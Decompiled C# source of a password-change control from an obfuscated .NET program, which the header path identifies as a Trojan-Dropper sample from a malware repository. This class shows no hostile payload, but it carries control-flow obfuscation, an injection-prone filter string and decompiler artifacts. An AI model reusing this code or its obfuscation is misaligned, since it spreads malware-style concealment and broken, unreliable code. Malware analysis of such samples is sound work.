// Decompiled with JetBrains decompiler
// Type: AltiumManager.changePassCtrl
// Assembly: NtRFufHofqVzZAe, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A3465D-1BFC-53F3-99D7-B93CF53E7ECD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-3a2a9cfdbd61a0059dfc842bf5333d9548d205d7c6313ef12be7840df044fc87.exe

using AltiumManager.AltiumDatabaseDataSetTableAdapters;
using AltiumManager.My;
using AltiumManager.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace AltiumManager
{
  [DesignerGenerated]
  public class changePassCtrl : UserControl
  {
    private IContainer components;
    private activeUserClass pUserObj;

    public changePassCtrl() => this.\uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE181();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (((!disposing ? 1 : 0) != 0 || this.components == null ? 1 : 0) != 0)
          return;
label_5:
        int num1 = 0;
        int num2 = -21;
        while (true)
        {
          switch ((num2 ^ 153) + 145)
          {
            case 0:
              goto label_5;
            case 1:
              switch (num1)
              {
                case 151:
                  num1 = 3;
                  goto label_2;
                case 152:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.get_currPassTxt);
                  num1 = 1;
                  goto label_2;
                case 153:
                  this.components.Dispose();
                  num1 = 14;
                  goto label_2;
                case 154:
                  goto label_12;
                default:
                  num2 = -10;
                  continue;
              }
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.get_Label2);
              // ISSUE: reference to a compiler-generated method
              num2 = Platinium.\uE914\uE4B6\uE066\uEBD1\uE75B\uE04D\uE6A3\uF28F\uF124\uF18E\uEEEF\uE130(136);
              continue;
            case 3:
label_2:
              num1 ^= 153;
              break;
          }
          num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(91);
        }
label_12:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE181()
    {
label_2:
      int num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF485(134);
label_1:
      while (true)
      {
        num1 ^= 150;
        switch (num1 + 153)
        {
          case 0:
            this.Controls.Add((Control) this.Label1);
            this.Name = nameof (changePassCtrl);
            this.Size = new Size(265, 89);
            num1 = -28;
            continue;
          case 1:
            this.Controls.Add((Control) this.newPassTxt);
            this.Controls.Add((Control) this.currPassTxt);
            this.Controls.Add((Control) this.Label2);
            num1 = -15;
            continue;
          case 2:
            this.changeBtn.UseVisualStyleBackColor = true;
            this.AltiumDatabaseDataSet.DataSetName = "AltiumDatabaseDataSet";
            this.AltiumDatabaseDataSet.SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
            num1 = -32;
            continue;
          case 3:
            this.changeBtn.Size = new Size(75, 23);
            this.changeBtn.TabIndex = 4;
            this.changeBtn.Text = "Change";
            num1 = -1;
            continue;
          case 4:
            this.Label1.AutoSize = true;
            this.Label1.Location = new Point(14, 9);
            this.Label1.Name = "Label1";
            num1 = -27;
            continue;
          case 5:
            goto label_9;
          case 6:
            this.currPassTxt.TabIndex = 2;
            this.currPassTxt.UseSystemPasswordChar = true;
            this.newPassTxt.Location = new Point(113, 31);
            num1 = -19;
            continue;
          case 7:
            this.components = (IContainer) new System.ComponentModel.Container();
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.currPassTxt = new TextBox();
            num1 = -18;
            continue;
          case 8:
            this.AltiumDatabaseDataSet.BeginInit();
            ((ISupportInitialize) this.UsersBindingSource).BeginInit();
            this.SuspendLayout();
            num1 = -3;
            continue;
          case 9:
            this.TableAdapterManager.BackupDataSetBeforeUpdate = false;
            this.TableAdapterManager.UpdateOrder = TableAdapterManager.UpdateOrderOption.InsertUpdateDelete;
            this.TableAdapterManager.UsersTableAdapter = this.UsersTableAdapter;
            num1 = -25;
            continue;
          case 10:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.Controls.Add((Control) this.changeBtn);
            num1 = -2;
            continue;
          case 11:
            this.AltiumDatabaseDataSet.EndInit();
            ((ISupportInitialize) this.UsersBindingSource).EndInit();
            this.ResumeLayout(false);
            num1 = -22;
            continue;
          case 12:
            this.Label1.Size = new Size(93, 13);
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Current Password:";
            num1 = -31;
            continue;
          case 13:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (changePassCtrl.set_changeBtn);
            num1 = -30;
            continue;
          case 14:
            this.Label2.Size = new Size(81, 13);
            this.Label2.TabIndex = 1;
            this.Label2.Text = "New Password:";
            num1 = -6;
            continue;
          case 15:
            this.UsersBindingSource.DataMember = "Users";
            this.UsersBindingSource.DataSource = (object) this.AltiumDatabaseDataSet;
            this.UsersTableAdapter.ClearBeforeFill = true;
            num1 = AltiumDatabaseDataSet.ReleasedComponentsDataTable.\uE793\uEAE2\uE6B1\uF808\uF6E3\uEDE6\uEBAD\uE72E\uE85D\uEE14\uEA64\uF258(151);
            continue;
          case 16:
            this.Label2.AutoSize = true;
            this.Label2.Location = new Point(26, 34);
            this.Label2.Name = "Label2";
            num1 = -29;
            continue;
          case 17:
            this.newPassTxt = new TextBox();
            this.changeBtn = new Button();
            this.AltiumDatabaseDataSet = new AltiumDatabaseDataSet();
            num1 = -17;
            continue;
          case 18:
            this.UsersBindingSource = new BindingSource(this.components);
            this.UsersTableAdapter = new UsersTableAdapter();
            this.TableAdapterManager = new TableAdapterManager();
            num1 = -7;
            continue;
          case 19:
            this.newPassTxt.UseSystemPasswordChar = true;
            this.changeBtn.Location = new Point(97, 57);
            this.changeBtn.Name = "changeBtn";
            num1 = -4;
            continue;
          case 20:
            this.newPassTxt.Name = "newPassTxt";
            this.newPassTxt.Size = new Size(135, 20);
            this.newPassTxt.TabIndex = 3;
            num1 = -20;
            continue;
          case 21:
            goto label_32;
          default:
            goto label_2;
        }
      }
label_9:
      int num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(89);
      while (true)
      {
        switch ((num2 ^ 146) + 154)
        {
          case 0:
            this.currPassTxt.Name = "currPassTxt";
            num2 = -2;
            continue;
          case 1:
            this.currPassTxt.Size = new Size(135, 20);
            num2 = -7;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.set_UsersBindingSource);
            num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(87);
            continue;
          case 3:
            this.currPassTxt.Location = new Point(113, 6);
            num2 = -8;
            continue;
          case 4:
            num2 = -12;
            continue;
          case 5:
            num1 = -5;
            num2 = -1;
            continue;
          case 6:
            num2 = -11;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_32:
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("currPassTxt")]
    internal virtual TextBox currPassTxt { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("newPassTxt")]
    internal virtual TextBox newPassTxt { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button changeBtn
    {
      get => this._changeBtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE182);
        Button changeBtn1 = this._changeBtn;
        if ((changeBtn1 == null ? 1 : 0) == 0)
          changeBtn1.Click -= eventHandler;
        this._changeBtn = value;
        Button changeBtn2 = this._changeBtn;
        if ((changeBtn2 == null ? 1 : 0) != 0)
          return;
        changeBtn2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("AltiumDatabaseDataSet")]
    internal virtual AltiumDatabaseDataSet AltiumDatabaseDataSet { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersBindingSource")]
    internal virtual BindingSource UsersBindingSource { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersTableAdapter")]
    internal virtual UsersTableAdapter UsersTableAdapter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TableAdapterManager")]
    internal virtual TableAdapterManager TableAdapterManager { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    private void \uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE182(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = 24;
      loginClass loginClass;
      bool flag;
      while (true)
      {
        switch (num1 ^ 151)
        {
          case 142:
            loginClass.userName = this.pUserObj.userName;
            num1 = 6;
            continue;
          case 143:
            loginClass = new loginClass();
            num1 = 25;
            continue;
          case 144:
            flag = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.currPassTxt.Text, "", false) == 0 | Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.newPassTxt.Text, "", false) == 0;
            num1 = 4;
            continue;
          case 145:
            num1 = 7;
            continue;
          case 146:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.get_UsersTableAdapter);
            num1 = 5;
            continue;
          case 147:
            if (flag)
            {
              num1 = 3;
              continue;
            }
            goto label_11;
          case 148:
            goto label_10;
          default:
            goto label_2;
        }
      }
label_10:
      int num2 = 0;
      goto label_12;
label_11:
      num2 = 1;
label_12:
      if (num2 == 0)
      {
        int num3 = (int) Interaction.MsgBox((object) "Please fill out the boxes");
      }
      else
      {
        if ((loginClass.userAvailable(this.AltiumDatabaseDataSet.Users, this.UsersTableAdapter) ? 1 : 0) == 0)
        {
          AltiumDatabaseDataSet.UsersRow[] usersRowArray = (AltiumDatabaseDataSet.UsersRow[]) this.AltiumDatabaseDataSet.Users.Select("Username = '" + loginClass.userName + "'");
          string userPass = usersRowArray[0].UserPass;
          Simple3Des simple3Des1 = new Simple3Des(this.currPassTxt.Text);
          try
          {
            simple3Des1.decryptData(userPass);
label_18:
            int num4 = 9;
            string str;
            Simple3Des simple3Des2;
            while (true)
            {
              switch (num4 ^ 147)
              {
                case 151:
                  num4 = 13;
                  continue;
                case 152:
                  \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF151\uE2D4\uE328\uF2F5\uF0E9\uF6F9\uECD0\uF1D2\uE69B\uE51C\uEF67\uEEF7.\uF400\uE7A2\uE384\uE3F3\uE335\uEB9D\uF492\uF50B\uF616\uF365\uE8E0\uF3E4.LogoutToolStripMenuItem.PerformClick();
                  num4 = 15;
                  continue;
                case 153:
                  usersRowArray[0].UserPass = str;
                  num4 = 4;
                  continue;
                case 154:
                  simple3Des2 = new Simple3Des(this.newPassTxt.Text);
                  num4 = 12;
                  continue;
                case 155:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.\uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE181);
                  num4 = 8;
                  continue;
                case 156:
                  num4 = 51;
                  continue;
                case 157:
                  int num5 = (int) Interaction.MsgBox((object) "Password has been changed. Logging out");
                  num4 = 11;
                  continue;
                case 158:
                  this.UsersTableAdapter.Update(this.AltiumDatabaseDataSet.Users);
                  num4 = 14;
                  continue;
                case 159:
                  str = simple3Des2.encryptData("text");
                  num4 = 10;
                  continue;
                case 160:
                  goto label_30;
                default:
                  goto label_18;
              }
            }
          }
          catch (CryptographicException ex)
          {
            ProjectData.SetProjectError((Exception) ex);
            int num6 = (int) Interaction.MsgBox((object) "Incorrect password");
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          int num7 = (int) Interaction.MsgBox((object) "User not found");
        }
label_30:;
      }
    }

    public void getActiveUser(activeUserClass tempUser) => this.pUserObj = tempUser;

    private void \uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE183(
      object _param1,
      EventArgs _param2)
    {
label_5:
      int num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF485(119);
      int num2 = -26;
      while (true)
      {
        switch ((num2 ^ 150) + 147)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.\uECB8\uE9C4\uE915\uF2B5\uF86C\uF79A\uF8BE\uEEF0\uF848\uEE1E\uE435\uE183);
            num2 = -5;
            continue;
          case 1:
            goto label_5;
          case 2:
            switch (num1 + 155)
            {
              case 0:
                this.Validate();
                num1 = -2;
                goto label_1;
              case 1:
                this.TableAdapterManager.UpdateAll(this.AltiumDatabaseDataSet);
                num1 = -4;
                goto label_1;
              case 2:
                num1 = -16;
                goto label_1;
              case 3:
                this.UsersBindingSource.EndEdit();
                num1 = -15;
                goto label_1;
              case 4:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.get_currPassTxt);
                num1 = -1;
                goto label_1;
              case 5:
                goto label_12;
              default:
                num2 = -8;
                continue;
            }
          case 3:
label_1:
            num1 ^= 150;
            break;
        }
        num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(92);
      }
label_12:;
    }
  }
}
